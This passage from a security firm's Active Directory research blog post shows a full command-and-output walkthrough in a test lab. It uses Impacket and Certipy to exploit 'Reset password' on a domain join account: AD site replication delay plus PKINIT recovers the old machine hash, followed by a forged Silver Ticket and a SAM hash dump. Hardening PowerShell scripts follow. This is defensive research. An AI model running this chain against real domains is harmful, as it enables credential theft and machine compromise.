+[*] Trying to retrieve NT hash for &#39;demomachine$&#39;
+[*] Got hash for &#39;demomachine$@test.local&#39;: aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
+
+user@adpen1:~$ KRB5CCNAME=~/demomachine.ccache smbclient.py DEMOMACHINE -no-pass -k -target-ip 100.64.5.212
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
+</code></pre><p>Same issue as with Shadow Credentials - the trust is broken.</p>
+<h2 id="finally-success-reset-password-revisited">Finally success (Reset password revisited)</h2>
+<p>After all these attempts there was not a single instance where we successfully
+compromised the target without breaking the trust. While feeling a bit low,
+a message was sent to a former colleague and awesome Windows hacker Jonas Vestberg
+(<a href="https://x.com/bugch3ck">@bugch3ck</a>) to discuss ideas.</p>
+<p>What this chat ended with was the idea of abusing replication delays in Active
+Directory sites and if these could be abused to get ahold the prior password before
+reset by using PKINIT. From experience of being a Windows SysAdm this reminded me about some old
+problems where different Active Directory sites could be out-of-sync when creating
+new accounts in a remote site, and the lowest threshold for sync was 15 minutes. An exception
+to this 15 minutes replication windows is Bad Password Count which
+always is incremented and verified against the
+PDC (Primary Domain Controller) so nobody could
+password guess an account N time <em>number-of-domain-controllers</em> before lockout.</p>
+<p>After brewing a cappuccino the task was set to expand the test environment with
+a DC02.</p>
+<p>A new, <code>Default-Second-Site-Name</code> was created and the secondary DC was assigned
+to this site:</p>
+<p><img src="active-directory-sites.png" alt="active-directory-sites.png"></p>
+<p>And thank you nightmares for helping me remember the 15 minutes sync schedule:</p>
+<p><img src="active-directory-sites-sync.png" alt="active-directory-sites-sync.png"></p>
+<p>So, first off, let&rsquo;s check that our target has its password replicated. This
+is done with DCSync with a domain admin account against each DC:</p>
+<pre tabindex="0"><code>user@adpen1:~$ secretsdump.py test.local/administrator:$DAPW@100.64.5.200 | grep DEMOMACHINE\$:1215; secretsdump.py test.local/administrator:$DAPW@100.64.55.200 | grep DEMOMACHINE\$:1215
+DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06:::
+DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06:::
+</code></pre><p>Awesome. We have sync and we have made sure our machine&rsquo;s trust relationship is working.</p>
+<p>What we do next is to reset the DEMOMACHINE$ password on DC01 (100.64.5.200)
+with our domain join account:</p>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\$ -no-add -computer-pass Password123 -dc-ip 100.64.5.200
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully set password of DEMOMACHINE$ to Password123.
+</code></pre><p>And now we have broken the trust between DEMOMACHINE$ and DC01 but the password has
+not yet replicated to DC02:</p>
+<pre tabindex="0"><code>user@adpen1:~$ secretsdump.py test.local/administrator:$DAPW@100.64.5.200 | grep DEMOMACHINE\$:1215; secretsdump.py test.local/administrator:$DAPW@100.64.55.200 | grep DEMOMACHINE\$:1215
+DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06:::
+</code></pre><p>This however contradicts what Steve Syfuhs <a href="https://syfuhs.net/on-computer-passwords">writes in his blog post</a> about
+computer account passwords:</p>
+<p><img src="priority-replication.png" alt="priority-replication.png"></p>
+<p>We will now turn to AD CS and request a certificate for our machine account with
+our newly set password:</p>
+<pre tabindex="0"><code>user@adpen1:~$ certipy req -username DEMOMACHINE\$@test.local -password Password123 -ca test-CA01-CA -ns 100.64.5.200 -template Computer2 -dc-ip 100.64.5.200 -target ca01.test.local -upn DEMOMACHINE\$ -sid S-1-5-21-801220465-3856247095-653829165-1215
+Certipy v5.0.1 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 39
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;DEMOMACHINE$&#39;
+[*] Certificate object SID is &#39;S-1-5-21-801220465-3856247095-653829165-1215&#39;
+[*] Saving certificate and private key to &#39;demomachine.pfx&#39;
+[*] Wrote certificate and private key to &#39;demomachine.pfx&#39;
+</code></pre><p>Now we&rsquo;ll exchange the certificate for a Kerberos TGT via i<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b">PKINIT</a>. We can obtain the NTLM hash
+of the account as we can decrypt the ticket with the AES key. This is automated
+in <code>certipy auth</code>:</p>
+<pre tabindex="0"><code>user@adpen1:~$ certipy auth -pfx demomachine.pfx -dc-ip 100.64.5.200 -domain test.local -username DEMOMACHINE\$
+Certipy v5.0.1 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;DEMOMACHINE$&#39;
+[*]     SAN URL SID: &#39;S-1-5-21-801220465-3856247095-653829165-1215&#39;
+[*] Using principal: &#39;demomachine$@test.local&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;demomachine.ccache&#39;
+[*] Wrote credential cache to &#39;demomachine.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;demomachine$&#39;
+[*] Got hash for &#39;demomachine$@test.local&#39;: aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
+</code></pre><p>Yes we receive the NTLM hash that we initially set: <code>58a478135a93ac3bf058a5ea0e8fdb71</code> (a.k.a Password123)</p>
+<p>If we now however turn to DC02 - what hash will we obtain?</p>
+<pre tabindex="0"><code>user@adpen1:~$ certipy auth -pfx demomachine.pfx -dc-ip 100.64.55.200 -domain test.local -username DEMOMACHINE\$
+Certipy v5.0.1 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;DEMOMACHINE$&#39;
+[*]     SAN URL SID: &#39;S-1-5-21-801220465-3856247095-653829165-1215&#39;
+[*] Using principal: &#39;demomachine$@test.local&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;demomachine.ccache&#39;
+[*] Wrote credential cache to &#39;demomachine.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;demomachine$&#39;
+[*] Got hash for &#39;demomachine$@test.local&#39;: aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06
+</code></pre><p>SCORE! We now have obtain the initial machine account password that we
+previously did not know: <code>08730b1c9e9b033c5aa8eda12db7da06</code></p>
+<p>Now we&rsquo;ll restore the trust:</p>
+<pre tabindex="0"><code>user@adpen1:~$ changepasswd.py test.local/DEMOMACHINE\$:Password123@test.local  -newhashes 08730b1c9e9b033c5aa8eda12db7da06:08730b1c9e9b033c5aa8eda12db7da06 -dc-ip 100.64.5.200
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Changing the password of test.local\DEMOMACHINE$
+[*] Connecting to DCE/RPC as test.local\DEMOMACHINE$
+[*] Password was changed successfully.
+[!] User will need to change their password on next logging because we are using hashes.
+</code></pre><p>And create our Silver Ticket to compromise the target:</p>
+<pre tabindex="0"><code>user@adpen1:~$ ticketer.py -nthash 08730b1c9e9b033c5aa8eda12db7da06 -domain-sid S-1-5-21-801220465-3856247095-653829165 -user-id 1103 -domain test.local -spn &#39;CIFS/DEMOMACHINE&#39; test-admin 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for test.local/test-admin
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in test-admin.ccache
+
+user@adpen1:~$ KRB5CCNAME=~/test-admin.ccache secretsdump.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x8e0ddbb9e9d348123a2d025c3253ee03
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+[...]
+</code></pre><p>Yay! This actually worked.. So in summary</p>
+<p><img src="summary.png" alt="summary.png"></p>
+<p>The requirements for this attack to work include access to a domain join account with <code>Reset password</code>
+on a target computer object. In addition an Active Directory Certificate Server
+which is able to generate Computer certificates. This is very common
+as this is basically what allows companies to run certificate based
+enterprise WLAN&rsquo;s. Additionally more than one Active Directory site is needed
+in order to have a 15 minute windows of replication time.</p>
+<p>Enough shenanigans for now. Let&rsquo;s attempt to wrap up this article together with all
+mitigations we have set for our domain join account..</p>
+<h1 id="summary">Summary</h1>
+<p>So we reviewed a lot of ACEs and learned a lot about Active Directory ACEs,
+inheritance, default SDDL and precedence.</p>
+<p>We have shown how we could abuse default permissions assigned to our domain join
+account to perform Read Legacy-LAPS, RBCD, Shadow Credentials and finally managed to
+exploit <code>Reset password</code> without breaking machine trust.</p>
+<p>It should also be noted that <code>Reset password</code> abuse comes without any mitigation
+if the ability to reinstall a machine with SCCM is to remain possible.</p>
+<h1 id="mitigations">Mitigations</h1>
+<p>The recommendation shown on Microsoft&rsquo;s web site creates an over-privileged domain
+join account which if obtained by an attacker, can be used to compromise all
+machines which it has joined to the domain.</p>
+<table>
+<thead>
+<tr>
+<th>Permission</th>
+<th>Type</th>
+<th>Notes</th>
+<th>Exploitable</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Read all properties</td>
+<td>Read</td>
+<td>Full read access to object attributes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Change password</td>
+<td>Modify</td>
+<td>User can change their own password</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Reset password</td>
+<td>Modify</td>
+<td>Administrative password reset capability</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Read and Write account restrictions</td>
+<td>Modify</td>
+<td>Write attributes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Validated write to DNS host name</td>
+<td>Validated Write</td>
+<td>Controlled DNS hostname modification</td>
+<td>Not reviewed</td>
+</tr>
+<tr>
+<td>Validated write to service principal name</td>
+<td>Validated Write</td>
+<td>Controlled SPN modification</td>
+<td>Not reviewed</td>
+</tr>
+<tr>
+<td>Allowed to authenticate</td>
+<td>Security</td>
+<td>Permission to authenticate to the domain</td>
+<td>Not Reviewed</td>
+</tr>
+<tr>
+<td>Write computername (pre-Windows 2000)</td>
+<td>Write</td>
+<td>Legacy computer name attribute</td>
+<td>Not Reviewed</td>
+</tr>
+<tr>
+<td>Write description</td>
+<td>Write</td>
+<td>Description attribute</td>
+<td>No</td>
+</tr>
+</tbody>
+</table>
+<p>The following steps provide a hardened environment, where no known
+compromise can be performed from the perspective of the domain join account:</p>
+<ol>
+<li>Disable arbitrary users to create computer accounts</li>
+</ol>
+<pre tabindex="0"><code>Set-ADDomain -Identity test.local -Replace @{ &#39;ms-DS-MachineAccountQuota&#39; = 0 } -Verbose
+</code></pre><ol start="2">
+<li>Change the owner from domain join to Domain Admins on all computers (Needs recurring run):</li>
+</ol>
+<pre tabindex="0"><code>$domain=&#34;TEST&#34;
+$comps = Get-ADComputer -filter *
+
+foreach($comp in $comps){
+    $comppath = &#34;AD:$($comp.DistinguishedName.ToString())&#34;
+    $acl = Get-Acl -Path $comppath
+    $objUser = New-Object System.Security.Principal.NTAccount($domain, &#34;Domain Admins&#34;)
+    $acl.SetOwner($objUser)
+    Set-Acl -Path $comppath -AclObject $acl
+}
+</code></pre><ol start="3">
+<li>Allow domain join account to Create and Delete computer objects only in specific OUs:</li>
+</ol>
+<pre tabindex="0"><code># ---- SETTINGS ----
+$ouDN   = &#34;OU=Workstations,DC=test,DC=local&#34;
+$entity = &#34;domainjoin&#34;
+$permission = &#34;Allow&#34;
+# ------------------
+
+# Get the schemaIDGUID for the &#39;computer&#39; class (object-specific ACE)
+$schemaNC      = (Get-ADRootDSE).schemaNamingContext
+$computerClass = Get-ADObject -SearchBase $schemaNC -LDAPFilter &#34;(lDAPDisplayName=computer)&#34; -Properties schemaIDGUID
+$guid          = [Guid]$computerClass.schemaIDGUID
+
+# ACE: Allow CreateChild + DeleteChild for the &#39;computer&#39; class
+$adRights          = [System.DirectoryServices.ActiveDirectoryRights]::CreateChild -bor [System.DirectoryServices.ActiveDirectoryRights]::DeleteChild
+$objectType        = $guid
+$inheritanceType   = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
+$accessControlType = [System.Security.AccessControl.AccessControlType]::$permission
+$identityReference = New-Object System.Security.Principal.NTAccount($entity)
+
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType)
+
+# Apply to the OU
+$acl = Get-ACL &#34;AD:$ouDN&#34;
+$acl.AddAccessRule($ace)
+Set-ACL -Path &#34;AD:$ouDN&#34; -AclObject $acl
+</code></pre><ol start="4">
+<li>Deny domain join Legacy-LAPS read access on all computers (Needs recurring run):</li>
+</ol>
+<pre tabindex="0"><code># ---- SETTINGS ----
+$entity = &#34;domainjoin&#34;
+$guid = &#34;ad27bc2b-cf04-424d-b705-5df50c7d5d37&#34; # ms-Mcs-AdmPwd
+$property = &#34;ReadProperty&#34;
+$permission = &#34;Deny&#34;
+# -------------------
+
+# Define the ACE properties
+$adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property
+$objectType = New-Object Guid $guid # GUID for the specific property
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$accessControlType = [System.Security.AccessControl.AccessControlType]::$permission
+$identityReference = New-Object System.Security.Principal.NTAccount($entity)
+
+# Create the ACE
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType)
+
+# Get ALL computer objects in the forest root domain and apply the deny
+$computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName
+foreach($computer in $computerDNs){
+	# Get the current ACL of the computer object
+	$acl = Get-ACL &#34;AD:$computer&#34;
+	# Add the new ACE to the ACL
+	$acl.AddAccessRule($ace)
+	# Set the modified ACL back to the computer object
+	Set-ACL -Path &#34;AD:$computer&#34; -AclObject $acl
+}
+</code></pre><ol start="5">
+<li>Deny domain join RBCD actions (Need recurring run):</li>
+</ol>
+<pre tabindex="0"><code># ---- SETTINGS ----
+$entity = &#34;domainjoin&#34;
+$guid = &#34;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79&#34; # Write msDS-AllowedToActOnBehalfOfOtherIdentity
+$property = &#34;WriteProperty&#34;
+$permission = &#34;Deny&#34;
+# -------------------
+
+# Define the ACE properties
+$adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property
+$objectType = New-Object Guid $guid # GUID for the specific property
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$accessControlType = [System.Security.AccessControl.AccessControlType]::$permission
+$identityReference = New-Object System.Security.Principal.NTAccount($entity)
+
+# Create the ACE
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType)
+
+# Get ALL computer objects in the forest root domain and apply the deny
+$computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName
+foreach($computer in $computerDNs){
+	# Get the current ACL of the computer object
+	$acl = Get-ACL &#34;AD:$computer&#34;
+	# Add the new ACE to the ACL
+	$acl.AddAccessRule($ace)
+	# Set the modified ACL back to the computer object
+	Set-ACL -Path &#34;AD:$computer&#34; -AclObject $acl
+}
+</code></pre><ol start="6">
+<li>Deny Reset password for domain join (Need recurring run and <strong>breaks the ability to rejoin a machine with domain join account</strong>):</li>
+</ol>
+<pre tabindex="0"><code># ---- SETTINGS ----
+$entity = &#34;domainjoin&#34;
+$guid = &#34;00299570-246d-11d0-a768-00aa006e0529&#34; # Extended right GUID for &#34;Reset Password&#34;
+$property = &#34;ExtendedRight&#34;
+$permission = &#34;Deny&#34;
+# -------------------
+
+
+# Define the ACE properties (template style)
+$adRights           = [System.DirectoryServices.ActiveDirectoryRights]::$property
+$objectType         = New-Object Guid $guid # GUID for the specific property
+$inheritanceType    = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None  # this object only
+$accessControlType  = [System.Security.AccessControl.AccessControlType]::$permission
+$identityReference  = New-Object System.Security.Principal.NTAccount($entity)
+
+# Create the ACE
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType)
+
+# Get ALL computer objects in the forest root domain and apply the deny
+$computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName
+foreach($computer in $computerDNs){
+    $acl = Get-ACL &#34;AD:$computer&#34;
+    $acl.AddAccessRule($ace)
+    Set-ACL -Path &#34;AD:$computer&#34; -AclObject $acl
+}
+</code></pre><h2 id="ending-words">Ending words</h2>
+<p>In the middle of writing this research post <a href="https://specterops.io/blog/2025/10/01/writeaccountrestrictions-war-what-is-it-good-for/">SpecterOps (Garrett Foster) publicised similar findings</a>
+which also touches <code>Reset password</code>, <code>Write Account Restrictions</code> and Microsoft domain
+join account permission. Feeling a bit down over the fact that our research partly
+overlapped my spirits were lifted when me and Garrett sat down in a 75 minute
+screen sharing session exchanging and discussing notes from our research. Really
+nice guy and very happy to have met him.</p>
+<p>And shout-out to Jonas Vestberg for dropping the idea of replication delays!</p>
+<p>Follow us on LinkedIn (<a href="https://linkedin.com/company/shelltrail">https://linkedin.com/company/shelltrail</a>) for more
+cybersecurity related content,</p>
+<p>Cheers</p>
+
+    </div>
+
+    
+
+
+
+    
+      
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+    
+  
+  
+  <div class="media author-card" itemscope itemtype="http://schema.org/Person">
+    
+
+    <div class="media-body">
+      <h5 class="card-title" itemprop="name"><a href="https://www.shelltrail.com/"></a></h5>
+      
+      
+      <ul class="network-icon" aria-hidden="true">
+        
+      </ul>
+    </div>
+  </div>
+
+
+
+      
+      
+    
+
+    
+
+    
+
+
+  </div>
+</article>
+
+      
+
+    
+    
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" integrity="sha256-X5PoE3KU5l+JcX+w09p/wHl9AzK333C4hJ2I9S5mD4M=" crossorigin="anonymous"></script>
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js" integrity="sha256-aYTdUrn6Ow1DDgh5JTc3aDGnnju48y/1c8s1dgkYPQ8=" crossorigin="anonymous"></script>
+        
+      
+
+      
+      
+    
+
+    
+    
+
+    
+    
+    
+
+    
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <script src="/js/academia.min.6c2ba2801d406881b3c2277043cedd76.js"></script>
+
+    
+
+
+
+
+
+
+  
+  <div class="container">
+    <footer class="site-footer">
+  <div class="container">
+    <div class="row align-items-center">
+      <div class="col-md-6 mb-4 mb-md-0">
+        
+        <p class="mb-0">
+          Copyright © 2025 &middot; 
+	  Shelltrail AB 559319-6164
+        </p>
+      </div>
+      <div class="col-md-6">
+        <ul class="list-inline network-icon text-right mb-0">
+          
+          
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
